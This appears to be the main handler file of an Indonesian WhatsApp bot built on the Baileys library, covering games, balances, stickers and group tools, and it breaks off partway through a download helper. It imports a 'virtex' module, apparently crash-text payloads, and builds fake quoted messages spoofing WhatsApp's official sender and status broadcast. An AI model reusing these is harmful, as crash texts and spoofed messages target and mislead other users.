const {
	WAConnection,
	MessageType,
	Presence,
	MessageOptions,
	Mimetype,
	WALocationMessage,
	WA_MESSAGE_STUB_TYPES,
	WA_DEFAULT_EPHEMERAL,
	ReconnectMode,
	ProxyAgent,
	ChatModification,
	GroupSettingChange,
	waChatKey,
	mentionedJid,
	processTime,
	Browsers,
} = require("@adiwajshing/baileys")
const moment = require(
	"moment-timezone")
const simple = require(
	'./VXROLB/simple.js')
const speed = require('performance-now')
const {
	spawn,
	exec,
	execSync
} = require("child_process")
const ffmpeg = require('fluent-ffmpeg')
const twitterGetUrl = require(
	"twitter-url-direct")
const googleImage = require('g-i-s')
const brainly = require(
	'brainly-scraper')
const fetch = require('node-fetch');
const request = require('request');
const yts = require('yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const axios = require("axios")
const fs = require("fs-extra")
const util = require('util')
const got = require("got");
const hx = require('hxz-api')
const qrcodes = require('qrcode');
const { wait } = require('./lib/functions')
const imgbb = require('imgbb-uploader');
const os = require('os');
const {
	virtex,
	vipi
} = require('./VXROLB/virtex.js')
const Mfake = fs.readFileSync(
	'./VXROMD/vxrobot.jpg')
const Mthumb = fs.readFileSync(
	'./VXROMD/vxrobot.jpg')
	const timeWib = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
	const timeWita = moment().tz('Asia/Makassar').format('DD/MM HH:mm:ss')
	const timeWit = moment().tz('Asia/Jayapura').format('DD/MM HH:mm:ss')
	let d = new Date
	let locale = 'id'
	let gmt = new Date(0).getTime() - new Date('1 January 2021').getTime()
	const weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
	const week = d.toLocaleDateString(locale, { weekday: 'long' })
	const calender = d.toLocaleDateString(locale, {
	day: 'numeric',
	month: 'long',
	year: 'numeric'
   })

const Exif = require('./VXROLB/exif');
const exif = new Exif();
const saynye = JSON.parse(fs.readFileSync('./database/user/listsay.json'))
const {
	downloadMenu,
	infoMenu,
	gameMenu,
	groupMenu,
	funMenu,
	wibuMenu,
	ownerMenu,
	stickerMenu,
	otherMenu,
	rulesBot,
	islamMenu,
	sertiMenu,
	ceritaMenu,
	makerMenu,
	dewasaMenu,
	toolsMenu
} = require('./VXROMSG/help.js')
const {
	getBuffer,
	getGroupAdmins,
	getRandom,
	runtime,
	sleep
} = require('./VXROLB/myfunc')
const {
	fetchJson,
	getBase64,
	kyun,
	createExif
} = require('./VXROLB/fetch')
const {
	color,
	bgcolor
} = require('./VXROLB/color')
const {
	mess
} = require('./VXROMSG/mess')
const cheerio = require("cheerio")
const {
	pinterest
} = require('./VXROLB/pinterest')
const {
	Toxic
} = require('./VXROLB/Toxic.js')
const {
	AnimeWallpaper
} = require(
	'./node_modules/anime-wallpaper/dist'
	);
const wall = new AnimeWallpaper();
const ggs = require('google-it')
const {
	wikiSearch
} = require('./VXROLB/wiki.js')
const {
	EmojiAPI
} = require("emoji-api");
const emoji = new EmojiAPI();
const {
	herolist
} = require('./VXROLB/herolist.js')

const {
	Tiktokdl
} = require('./VXROLB/tiktok.js')
const {
	herodetails
} = require('./VXROLB/herodetail.js')
const anime = require(
	'@freezegold/anime.js');
const {
	cmdadd
} = require('./VXROLB/totalcmd.js')
const {
	isLimit,
	limitAdd,
	getLimit,
	giveLimit,
	addBalance,
	kurangBalance,
	getBalance,
	isGame,
	gameAdd,
	givegame,
	cekGLimit
} = require("./VXROLB/limit");
const {
	yta,
	ytv,
	igdl,
	upload,
	formatDate
} = require('./VXROLB/ytdl')
const {
	uptotele,
	uploadFile,
	RESTfulAPI,
	uploadImages
} = require('./VXROLB/uploadimage')
//const { isGame, gameAdd, givegame, cekGLimit } = require("./VXROLB/limit");
const {
	onGoing,
	dadu,
	asupan
} = require("./VXROLB/otakudesu.js")
const {
	mediafireDl
} = require('./VXROLB/mediafire.js')
const {
	addCommands,
	checkCommands,
	deleteCommands
} = require('./VXROLB/autoresp')
const {
	webp2gifFile,
	igDownloader,
	TiktokDownloader
} = require("./VXROLB/gif.js")
const {
	y2mateA,
	y2mateV
} = require('./VXROLB/y2mate')
const {
	ythd
} = require('./VXROLB/ytdl')
const premium = require(
	"./VXROLB/premium");
const afk = require("./VXROLB/afk");
const {
	isTicTacToe,
	getPosTic
} = require('./VXROLB/tictactoe')
const tictac = require(
	'./VXROLB/tictac')
const level = require("./VXROLB/level");
const atm = require("./VXROLB/atm");
const _sewa = require("./VXROLB/sewa");
const nsfww = JSON.parse(fs.readFileSync('./database/group/nsfww.json'))
const antinsfww = JSON.parse(fs.readFileSync('./database/group/nsfww.json'))
const antiviewonce = JSON.parse(fs.readFileSync('./database/group/antiviewonce.json'))
const banned = JSON.parse(fs.readFileSync('./database/user/banned.json'))
const bened = JSON.parse(fs.readFileSync('./database/user/bened.json'))

cmhit = []
var kuis = false
antivo = false
readG = true
antical = false
readP = false
autorespon = false
lolkey = 'vxro2k21'
nomorowner1 = "@6289516998339";

let tictactoe = []
hit_today = []
ky_ttt = []
/*const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await varo.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
varo.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}*/
const dfrply = fs.readFileSync('./VXROST/vxrobot.jpg')
const setGelud = require(
	'./VXROLB/gameGelud.js')
const game = require("./VXROLB/game");
const { weekdays } = require("moment-timezone")
tttawal = ["0️⃣", "1️⃣", "2️⃣", "3️⃣",
	"4️⃣", "5️⃣", "6️⃣", "7️⃣",
	"8️⃣", "9️⃣"
]
g = "```"
let setiker = JSON.parse(fs
	.readFileSync(
		'./VXROTMP/stik.json'))
let imagenye = JSON.parse(fs
	.readFileSync(
		'./VXROTMP/image.json'))
let videonye = JSON.parse(fs
	.readFileSync(
		'./VXROTMP/video.json'))
let audionye = JSON.parse(fs
	.readFileSync(
		'./VXROTMP/vn.json'))
let fakeimage = fs.readFileSync(
	"./VXROMD/vxrobot.jpg")
let thumb = fs.readFileSync(
	"./VXROMD/vxrobot.jpg")
let thumb2 = fs.readFileSync(
	"./VXROMD/vxrobot.jpg")
let errorImg =
	'https://i.ibb.co/FBm52Pt/1e0fe6a08b67.jpg'
let errorpng = fs.readFileSync(
	"./VXROMD/error.jpg")
let setting = JSON.parse(fs
	.readFileSync('./setting.json'))

owner = setting.owner
gamewaktu = setting.gamewaktu
limitCount = setting.limitCount
lolkey = setting.lolkey
dappakey = "vxrobot2k21"
botname = setting.botname
waktu = setting.waktu
simbol = "🇮🇩"
petik = '```'
fake = 'VXROBOT©2022' //
ban = []
tp = "```"
// Database
let register = JSON.parse(fs
	.readFileSync(
		'./database/user/register.json'
		))
let welkom = JSON.parse(fs.readFileSync(
	'./database/group/welcome.json'
	))
let _premium = JSON.parse(fs
	.readFileSync(
		'./database/user/premium.json'
		));
let _afk = JSON.parse(fs.readFileSync(
	'./database/user/afk.json'));
let _leveling = JSON.parse(fs
	.readFileSync(
		'./database/group/leveling.json'
		))
let _level = JSON.parse(fs.readFileSync(
	'./database/user/level.json'
	))
let _uang = JSON.parse(fs.readFileSync(
		'./database/user/uang.json'
		))
let glimit = JSON.parse(fs.readFileSync(
	'./database/user/glimit.json'
	));
let antilink = JSON.parse(fs
	.readFileSync(
		'./database/group/antilink.json'
		));
let mute = JSON.parse(fs.readFileSync(
	'./database/group/mute.json'
	));
let _update = JSON.parse(fs
	.readFileSync(
		'./database/bot/update.json'
		))
let sewa = JSON.parse(fs.readFileSync(
	'./database/group/sewa.json'
	));
let _scommand = JSON.parse(fs
	.readFileSync(
		'./database/bot/scommand.json'
		))
let balance = JSON.parse(fs
	.readFileSync(
		'./database/balance.json'));
let limit = JSON.parse(fs.readFileSync(
	'./database/user/limit.json'
	));
// GAME
let tebakanime = JSON.parse(fs
	.readFileSync(
		'./database/tebakanime.json'
		))
let tebakgambar = JSON.parse(fs
	.readFileSync(
		'./database/tebakgambar.json'
		))
let asahotak = JSON.parse(fs
	.readFileSync(
		'./database/asahotak.json'))
let caklontong = JSON.parse(fs
	.readFileSync(
		'./database/caklontong.json'
		))
let tebaksiapaaku = JSON.parse(fs
	.readFileSync(
		'./database/tebaksiapaaku.json'
		))
let tebakbendera = JSON.parse(fs
	.readFileSync(
		'./database/tebakbendera.json'
		))
let susunkata = JSON.parse(fs
	.readFileSync(
		'./database/susunkata.json')
	)
let tebakata = JSON.parse(fs
	.readFileSync(
		'./database/tebakata.json'))
let tebaklirik = JSON.parse(fs
	.readFileSync(
		'./database/tebaklirik.json'
		))
let commandsDB = JSON.parse(fs
	.readFileSync(
		'./database/commands.json'))
let tebakjenaka = JSON.parse(fs
	.readFileSync(
		'./database/tebakjenaka.json'
		))
let tebakimia = JSON.parse(fs
	.readFileSync(
		'./database/tebakimia.json')
	)
let kuismath = JSON.parse(fs
	.readFileSync(
		'./database/kuismath.json'))
let tebaklagu = JSON.parse(fs
	.readFileSync(
		'./database/tebaklagu.json')
	)
let tebaktebakan = JSON.parse(fs
	.readFileSync(
		'./database/tebaktebakan.json'
		))
let family100 = [];



// Sticker Cmd
const addCmd = (id, command) => {
	const obj = {
		id: id,
		chats: command
	}
	_scommand.push(obj)
	fs.writeFileSync(
		'./database/bot/scommand.json',
		JSON.stringify(
			_scommand))
}
const addATM = (sender) => {
	const obj = {
		id: sender,
		balance: 0
	}
	balance.push(obj)
	fs.writeFileSync(
		'./database/balance.json',
		JSON.stringify(balance))
}

const addKoinUser = (sender,
amount) => {
	let position = false
	Object.keys(balance).forEach((
		i) => {
			if (balance[i]
				.id === sender
				) {
				position = i
			}
		})
	if (position !== false) {
		balance[position].balance +=
			amount
		fs.writeFileSync(
			'./database/balance.json',
			JSON.stringify(
				balance))
	}
}


const checkATMuser = (sender) => {
	let position = false
	Object.keys(balance).forEach((
		i) => {
			if (balance[i]
				.id === sender
				) {
				position = i
			}
		})
	if (position !== false) {
		return balance[position]
			.balance
	}
}
const confirmATM = (sender, amount) => {
	let position = false
	Object.keys(balance).forEach((
		i) => {
			if (balance[i]
				.id === sender
				) {
				position = i
			}
		})
	if (position !== false) {
		balance[position].balance -=
			amount
		fs.writeFileSync(
			'./database/balance.json',
			JSON.stringify(
				balance))
	}
}

const getCommandPosition = (id) => {
	let position = null
	Object.keys(_scommand).forEach((
		i) => {
		if (_scommand[i]
			.id === id) {
			position = i
		}
	})
	if (position !== null) {
		return position
	}
}

const getCmd = (id) => {
	let position = null
	Object.keys(_scommand).forEach((
		i) => {
		if (_scommand[i]
			.id === id) {
			position = i
		}
	})
	if (position !== null) {
		return _scommand[position]
			.chats
	}
}


const checkSCommand = (id) => {
	let status = false
	Object.keys(_scommand).forEach((
		i) => {
		if (_scommand[i]
			.id === id) {
			status = true
		}
	})
	return status
}
async function faketoko(teks, url_image,
	title, code, price) {
	var punya_wa =
		"0@s.whatsapp.net"
	var ini_buffer =
		await getBuffer(url_image)
	const ini_cstoko = {
		contextInfo: {
			participant: punya_wa,
			remoteJid: 'status@broadcast',
			quotedMessage: {
				productMessage: {
					product: {
						currencyCode: code,
						title: title,
						priceAmount1000: price,
						productImageCount: 1,
						productImage: {
							jpegThumbnail: ini_buffer
						}
					},
					businessOwnerJid: "0@s.whatsapp.net"
				}
			}
		}
	}
	await varo.sendMessage(from,
		teks, text, ini_cstoko)
}



module.exports = varo = async (varo,
	mek) => {
	try {
		if (!mek.hasNewMessage)
			return
		mek = mek.messages
		.all()[0]
		if (!mek.message) return
		if (mek.key && mek.key
			.remoteJid ==
			'status@broadcast')
			return
		if (mek.key.id
			.startsWith(
			'3EB0') && mek.key
			.id.length === 12)
			return
		m = simple.smsg(varo,
			mek)
		//	global.ky_ttt
		global.blocked
		mek.message = (Object
				.keys(mek
					.message)[
				0] ===
				'ephemeralMessage'
				) ? mek.message
			.ephemeralMessage
			.message : mek
			.message
		const {
			text,
			extendedText,
			contact,
			location,
			liveLocation,
			image,
			video,
			sticker,
			document,
			audio,
			product
		} = MessageType
		const time = moment.tz(
				'Asia/Jakarta')
			.format(
				'DD/MM HH:mm:ss'
				)
		const wib = moment().tz(
				'asia/jakarta')
			.format("hh:mm:ss")
		const wita = moment.tz(
				'asia/makassar')
			.format('hh:mm:ss')
		const wit = moment.tz(
				'asia/jayapura')
			.format('hh:mm:ss')
		const content = JSON
			.stringify(mek
				.message)
		const from = mek.key
			.remoteJid
		const type = Object
			.keys(mek.message)[
				0]
		var pes = (type ===
				'conversation' &&
				mek.message
				.conversation) ?
			mek.message
			.conversation : (
				type ==
				'imageMessage'
				) && mek.message
			.imageMessage
			.caption ? mek
			.message
			.imageMessage
			.caption : (type ==
				'videoMessage'
				) && mek.message
			.videoMessage
			.caption ? mek
			.message
			.videoMessage
			.caption : (type ==
				'extendedTextMessage'
				) && mek.message
			.extendedTextMessage
			.text ? mek.message
			.extendedTextMessage
			.text : ''
		const messagesC = pes
			.slice(0).trim()
		isImage = (type ===
			'imageMessage')
		const cmd = (type ===
				'conversation' &&
				mek.message
				.conversation) ?
			mek.message
			.conversation : (
				type ==
				'imageMessage'
				) && mek.message
			.imageMessage
			.caption ? mek
			.message
			.imageMessage
			.caption : (type ==
				'videoMessage'
				) && mek.message
			.videoMessage
			.caption ? mek
			.message
			.videoMessage
			.caption : (type ==
				'extendedTextMessage'
				) && mek.message
			.extendedTextMessage
			.text ? mek.message
			.extendedTextMessage
			.text : ''.slice(1)
			.trim().split(/ +/)
			.shift()
			.toLowerCase()
		const prefix = '#'
		body = (type ===
				'conversation' &&
				mek.message
				.conversation
				.startsWith(
					prefix)) ?
			mek.message
			.conversation : (
				type ==
				'imageMessage'
				) && mek
			.message[type]
			.caption.startsWith(
				prefix) ? mek
			.message[type]
			.caption : (type ==
				'videoMessage'
				) && mek
			.message[type]
			.caption.startsWith(
				prefix) ? mek
			.message[type]
			.caption : (type ==
				'extendedTextMessage'
				) && mek
			.message[type].text
			.startsWith(
			prefix) ? mek
			.message[type]
			.text : (type ==
				'listResponseMessage'
				) && mek
			.message[type]
			.singleSelectReply
			.selectedRowId ? mek
			.message[type]
			.singleSelectReply
			.selectedRowId : (
				type ==
				'buttonsResponseMessage'
				) && mek
			.message[type]
			.selectedButtonId ?
			mek.message[type]
			.selectedButtonId :
			(type ==
				'stickerMessage'
				) && (getCmd(mek
					.message[
						type]
					.fileSha256
					.toString(
						'base64'
						)) !==
				null && getCmd(
					mek.message[
						type]
					.fileSha256
					.toString(
						'base64'
						)) !==
				undefined) ?
			getCmd(mek.message[
					type]
				.fileSha256
				.toString(
					'base64')) :
			""
		budy = (type ===
				'conversation'
				) ? mek.message
			.conversation : (
				type ===
				'extendedTextMessage'
				) ? mek.message
			.extendedTextMessage
			.text : ''
		const command = body
			.slice(1).trim()
			.split(/ +/).shift()
			.toLowerCase()
		const args = body.trim()
			.split(/ +/).slice(
				1)
		hit_today.push(command)
		const arg = body
			.substring(body
				.indexOf(' ') +
				1)
		const ar = args.map((
			v) => v
			.toLowerCase())
		const argz = body.trim()
			.split(/ +/).slice(
				1)
		const isCmd = body
			.startsWith(prefix)
		if (isCmd) cmdadd()
		const totalhit = JSON
			.parse(fs
				.readFileSync(
					'./database/totalcmd.json'
					))[0]
			.totalcmd
		const q = args.join(' ')


		const botNumber = varo
			.user.jid
		const ownerNumber =
			setting.ownerNumber
		const ownerName =
			setting.ownerName
		const botName = setting
			.botName
		const isGroup = from.endsWith('@g.us')
		/*	let sender = isGroup ? mek.participant : mek.key.remoteJid
			let senderr = mek.key.fromMe ? varo.user.jid : mek.key.remoteJid.endsWith('@g.us') ? mek.participant : mek.key.remoteJid*/
		const sender = mek.key
			.fromMe ?
			varo.user.jid :
			isGroup ?
			mek.participant :
			mek.key.remoteJid;
		let senderr = mek.key
			.fromMe ?
			varo.user.jid :
			mek.key.remoteJid
			.endsWith("@g.us") ?
			mek.participant :
			mek.key.remoteJid;
		const totalchat =
			await varo.chats
			.all()
		const groupMetadata =
			isGroup ?
			await varo
			.groupMetadata(
			from) : ''
		const groupName =
			isGroup ?
			groupMetadata
			.subject : ''
		const groupId =
			isGroup ?
			groupMetadata.jid :
			''
		const groupMembers =
			isGroup ?
			groupMetadata
			.participants : ''
		const groupDesc =
			isGroup ?
			groupMetadata.desc :
			''
		const groupOwner =
			isGroup ?
			groupMetadata
			.owner : ''
		const groupAdmins =
			isGroup ?
			getGroupAdmins(
				groupMembers) :
			''
		const isBotGroupAdmins =
			groupAdmins
			.includes(
			botNumber) || false
		const isGroupAdmins =
			groupAdmins
			.includes(sender) ||
			false
		const conts = mek.key
			.fromMe ? varo
			.user.jid : varo
			.contacts[sender] ||
			{
				notify: jid
					.replace(
						/@.+/,
						'')
			}
		const pushname = mek.key
			.fromMe ? varo
			.user.name : conts
			.notify || conts
			.vname || conts
			.name || '-'
		const mentionByTag =
			type ==
			"extendedTextMessage" &&
			mek.message
			.extendedTextMessage
			.contextInfo !=
			null ? mek.message
			.extendedTextMessage
			.contextInfo
			.mentionedJid : []
		const mentionByreply =
			type ==
			"extendedTextMessage" &&
			mek.message
			.extendedTextMessage
			.contextInfo !=
			null ? mek.message
			.extendedTextMessage
			.contextInfo
			.participant || "" :
			""
		const mention = typeof(
				mentionByTag) ==
			'string' ? [
				mentionByTag
			] : mentionByTag
		mention != undefined ?
			mention.push(
				mentionByreply
				) : []
		const mentionUser =
			mention !=
			undefined ? mention
			.filter(n => n) : []

		const isOwner =
			ownerNumber
			.includes(senderr)
		const isPremium =
			isOwner ? true :
			premium
			.checkPremiumUser(
				sender, _premium
				)
		   const isBanned = banned.includes(sender)
           const isNsfw = isGroup ? nsfww.includes(from) : false
		   const isAntiNsfw = isGroup ? antinsfww.includes(from) : false
		   const isAntiViewOnce = isGroup ? antiviewonce.includes(from) : false
		   const gcount = setting.gcount
		//const gcount =
			isPremium ? setting
			.gcount.prem :
			setting.gcount.user
		const isSewa = _sewa
			.checkSewaGroup(
				from, sewa)
		const isAfkOn = afk
			.checkAfkUser(
				sender, _afk)
		const senderNumber =
			sender.split("@")[0]
		const isLevelingOn =
			isGroup ? _leveling
			.includes(from) :
			false
		const isMuted =
			isGroup ? mute
			.includes(from) :
			false
		const isAntiLink =
			isGroup ? antilink
			.includes(from) :
			false
		const isWelkom =
			isGroup ? welkom
			.includes(from) :
			false

		// here button function
		selectedButton = (
				type ==
				'buttonsResponseMessage'
				) ? mek.message
			.buttonsResponseMessage
			.selectedButtonId :
			''

		responseButton = (
				type ==
				'listResponseMessage'
				) ? mek.message
			.listResponseMessage
			.title : ''

		// const gcount = setting.gcount

		const listmsg = (from,
			title, desc,
			list
			) => { // ngeread nya pake rowsId, jadi command nya ga keliatan
			let po = varo
				.prepareMessageFromContent(
					from, {
						"listMessage": {
							"title": title,
							"description": desc,
							"buttonText": "Pilih Disini",
							"footerText": "",
							"listType": "SINGLE_SELECT",
							"sections": list
						}
					}, {contextInfo: { mentionedJid: [sender,ownerNumber]},quoted:mek})
			return varo
				.relayWAMessage(
					po, {
						waitForAck: true
					})
		}

		const isUrl = (url) => {
			return url
				.match(
					new RegExp(
						/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/,
						'gi'
						))
		}

		function monospace(
			string) {
			return '```' +
				string + '```'
		}

		function jsonformat(
			string) {
			return JSON
				.stringify(
					string,
					null, 2)
		}

		function randomNomor(
			angka) {
			return Math.floor(
				Math
				.random() *
				angka) + 1
		}
		const reply = (
		teks) => {
			varo
				.sendMessage(
					from,
					teks,
					text, {contextInfo: { mentionedJid: [sender,ownerNumber]},
						quoted: mek,
						thumbnail: fakeimage
					})
		}
		const erply = (
			teks) => {
				varo
					.sendMessage(
						from,
						teks,
						text, {contextInfo: { mentionedJid: [sender,ownerNumber]},
							quoted: mek,
							thumbnail: errorpng
						})
			}
		const sendMess = (hehe,
			teks) => {
			varo
				.sendMessage(
					hehe,
					teks,
					text)
		}
		const mentions = (teks,
			memberr, id
			) => {
			(id == null ||
				id ==
				undefined ||
				id == false
				) ? varo
				.sendMessage(
					from, {
						text: teks
							.trim(),
						jpegThumbnail: fs
							.readFileSync(
								'./VXROMD/vxrobot.jpg'
								)
					},
					extendedText, {
						sendEphemeral: true,
						contextInfo: {
							"mentionedJid": memberr
						}
					}):
				varo
				.sendMessage(
					from, {
						text: teks
							.trim(),
						jpegThumbnail: fs
							.readFileSync(
								'./VXROMD/vxrobot.jpg'
								)
					},
					extendedText, {
						sendEphemeral: true,
						quoted: mek,
						contextInfo: {
							"mentionedJid": memberr
						}
					})
		}
		const sendText = (from,
			text) => {
			varo
				.sendMessage(
					from,
					text,
					MessageType
					.text)
		}
		const textImg = (
			teks) => {
				return varo
					.sendMessage(
						from,
						teks,
						text, {
							quoted: mek,
							thumbnail: fs
								.readFileSync(
									'./VXROMD/vxrobot.jpg'
									)
						})
			}
		const freply = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: '16504228206@s.whatsapp.net'
				} : {})
			},
			message: {
				"contactMessage": {
					"displayName": `${pushname}`,
					"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${senderr.split('@')[0]}:${senderr.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
					"jpegThumbnail": fs
						.readFileSync(
							'./VXROMD/vxrobot.jpg'
							)
				}
			}
		}
		const math = (teks) => {
			return Math
				.floor(teks)
		}
		const kick = function(
			from, orangnya
			) {
			for (let i of
					orangnya) {
				varo
					.groupRemove(
						from,
						[i])
			}
		}
		const ftoko = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "16505434800@s.whatsapp.net"
				} : {})
			},
			message: {
				"productMessage": {
					"product": {
						"productImage": {
							"mimetype": "image/jpeg",
							"jpegThumbnail": fs
								.readFileSync(
									`./VXROMD/vxrobot.jpg`
									)
						},
						"title": fake,
						"description": "VXRO",
						"currencyCode": "IDR",
						"priceAmount1000": "9999999999",
						"retailerId": "VXROBOT",
						"productImageCount": 1
					},
					"businessOwnerJid": `0@s.whatsapp.net`
				}
			}
		}
		const fkontak = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: `0@s.whatsapp.net`
				} : {})
			},
			message: {
				'contactMessage': {
					'displayName': `${pushname}`,
					'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
					'jpegThumbnail': fs
						.readFileSync(
							'./VXROMD/vxrobot.jpg'
							)
				}
			}
		}
		const fsticker = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "16505434800@s.whatsapp.net"
				} : {})
			},
			"message": {
				"stickerMessage": {
					"url": "https://mmg.whatsapp.net/d/f/Am6FBfNf-E2f1VoGBXkPaNAy7L6Tw_HMavKrHEt48QM4.enc",
					"fileSha256": "Yfj8SW7liSEnDakvyVlXVZQ1LJBC9idn09X7KHe8HTc=",
					"fileEncSha256": "F854aUrzgAkBTOVULpne4oSIi6S04Jo56pjZEo+p+9U=",
					"mediaKey": "Z3nA2asclAAwWHngNO/vJ81qxOE2/0gkEnXak+NxPV4=",
					"mimetype": "image/webp",
					"height": 64,
					"width": 64,
					"directPath": "/v/t62.15575-24/12097272_1193895144391295_8973688483514349023_n.enc?ccb=11-4&oh=5a9d7147627a8355569f1a641b9ebee3&oe=60C65E73",
					"fileLength": "7186",
					"mediaKeyTimestamp": "1622815545",
					"isAnimated": false
				}
			}
		}
		const fvn = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "16505434800@s.whatsapp.net"
				} : {})
			},
			message: {
				"audioMessage": {
					"mimetype": "audio/ogg; codecs=opus",
					"seconds": "9999999",
					"ptt": "true"
				}
			}
		}
		const floc2 = {
			key: {
				"fromMe": false,
				"participant": `0@s.whatsapp.net`,
				"remoteJid": "6289530863358-1621036495@g.us"
			},
			message: {
				"liveLocationMessage": {
					"caption": `${pushname}`,
					"name": `${prefix+command}`
				}
			}
		}
		const meki = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "16505434800@s.whatsapp.net"
				} : {})
			},
			message: {
				orderMessage: {
					itemCount: 1,
					status: 1,
					surface: 1,
					message: `${fake}`,
					orderTitle: 'VXRO',
					thumbnail: fs
						.readFileSync(
							'./VXROMD/vxrobot.jpg'
							),
					sellerJid: '0@s.whatsapp.net'
				}
			}
		}
		const mekeo = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "6289643739077-1613049930@g.us"
				} : {})
			},
			message: {
				"videoMessage": {
					"title": "VXROBOT",
					"h": `Hmm`,
					'seconds': '99999999999',
					'caption': `${fake}`,
					'jpegThumbnail': fs
						.readFileSync(
							'./VXROMD/vxrobot.jpg'
							)
				}
			}
		}
		const fgc = {
			key: {
				"fromMe": false,
				"participant": "0@s.whatsapp.net",
				"remoteJid": "0@s.whatsapp.net"
			},
			"message": {
				"groupInviteMessage": {
					"groupJid": "6289516998339-1604849118@g.us",
					"inviteCode": "Invite Group",
					"groupName": "🎌Weebs & Otakus🍃✨",
					"caption": `${fake}`,
					'jpegThumbnail': fs
						.readFileSync(
							'./VXROMD/vxrobot.jpg'
							)
				}
			}
		}
		const fgif = {
			key: {
				fromMe: false,
				participant: `6289516998339@s.whatsapp.net`,
				...(from ? {
					remoteJid: "6289516998339-1604849118@g.us"
				} : {})
			},
			message: {
				"videoMessage": {
					"title": "VXROBOT",
					"h": `Hmm`,
					'seconds': '99999',
					'gifPlayback': 'true',
					'caption': `${fake}`,
					'jpegThumbnail': fs
						.readFileSync(
							'./VXROMD/vxrobot.jpg'
							)
				}
			}
		}
		const floc = {
			key: {
				participant: '0@s.whatsapp.net'
			},
			message: {
				locationMessage: {
					name: 'Japan',
					jpegThumbnail: errorpng
				}
			}
		}
		const fdoc = {
			key: {
				participant: '0@s.whatsapp.net'
			},
			message: {
				documentMessage: {
					title: 'VXRO',
					jpegThumbnail: fs
						.readFileSync(
							'./VXROMD/vxrobot.jpg'
							)
				}
			}
		}
		if (isTicTacToe(from,
				tictactoe))
			tictac(budy, prefix,
				tictactoe, from,
				sender, reply,
				mentions,
				addBalance,
				balance)

		const kickMember =
		async (id,
				target = []
				) => {
				let group =
					await varo
					.groupMetadata(
						id)
				let owner =
					group
					.owner
					.replace(
						"c.us",
						"s.whatsapp.net"
						)
				let me =
					varo
					.user
					.jid
				for (i of
					target
					) {
					if (!i
						.includes(
							me
							) &&
						!i
						.includes(
							owner
							)
						) {
						await varo
							.groupRemove(
								to,
								[
									i]
								)
					} else {
						await varo
							.sendMessage(
								id,
								"Not Premited!",
								"conversation"
								)
						break
					}
				}
			}
		const add = function(
			from, orangnya
			) {
			varo.groupAdd(
				from,
				orangnya
				)
		}
		const sendKontak = (
				from, nomor,
				nama, org = ""
				) => {
				const vcard =
					'BEGIN:VCARD\n' +
					'VERSION:3.0\n' +
					'FN:' +
					nama +
					'\n' +
					'ORG:' +
					org + '\n' +
					'TEL;type=CELL;type=VOICE;waid=' +
					nomor +
					':+' +
					nomor +
					'\n' +
					'END:VCARD'
				varo
					.sendMessage(
						from, {
							displayname: nama,
							vcard: vcard
						},
						MessageType
						.contact, {
							quoted: mek
						})
			}
		const hideTag =
		async function(from,
				text) {
				let anu =
					await varo
					.groupMetadata(
						from
						)
				let members =
					anu
					.participants
				let ane = []
				for (let i of
						members) {
					ane.push(
						i
						.jid
						)
				}
				varo
					.sendMessage(
						from, {
							text: text,
							jpegThumbnail: fs
								.readFileSync(
									'./VXROMD/vxrobot.jpg'
									)
						},
						'extendedTextMessage', {
							contextInfo: {
								"mentionedJid": ane
							}
						})
			}
		const sendWebp = async (
			to, url
			) => {
			var names =
				Date
				.now() /
				10000;
			var download =
				function(
					uri,
					filename,
					callback
					) {
					request
						.head(
							uri,
							function(
								err,
								res,
								body
								) {
								request
									(
										uri)
									.pipe(
										fs
										.createWriteStream(
											filename
											)
										)
									.on('close',
										callback
										);
							}
							);
				};
			download(
				url,
				'./VXROST/' +
				names +
				'.png',
				async function() {
					console
						.log(
							'selesai'
							);
					let filess =
						'./VXROST/' +
						names +
						'.png'
					let asw =
						'./VXROST/' +
						names +
						'.webp'
					exec(`ffmpeg -i ${filess} -vf "scale=512:512:force_original_aspect_ratio=increase,fps=40, crop=512:512" ${asw}`,
						(
							err) => {
							fs.unlinkSync(
								filess
								)
							if (
								err)
								return reply(
									`${err}`
									)
							exec(`webpmux -set exif ./VXROST/data.exif ${asw} -o ${asw}`,
								async (
									error) => {
									if (
										error)
										return reply(
											`${error}`
											)
									varo
										.sendMessage(
											from,
											fs
											.readFileSync(
												asw
												),
											sticker, {
												sendEphemeral: true,
												quoted: mek
											}
											)
									fs.unlinkSync(
										asw
										)
								});
						}
						);
				});
		}
		const sendMediaURL =
			async (to, url,
					text = "",
					mids = []
					) => {
					if (mids
						.length >
						0) {
						text =
							normalizeMention(
								to,
								text,
								mids
								)
					}
					const fn =
						Date
						.now() /
						10000;
					const
						filename =
						fn
						.toString()
					let mime =
						""
					var download =
						function(
							uri,
							filename,
							callback
							) {
							request
								.head(
									uri,
									function(
										err,
										res,
										body
										) {
										mime =
											res
											.headers[
												'content-type'
												]
										request
											(
												uri)
											.pipe(
												fs
												.createWriteStream(
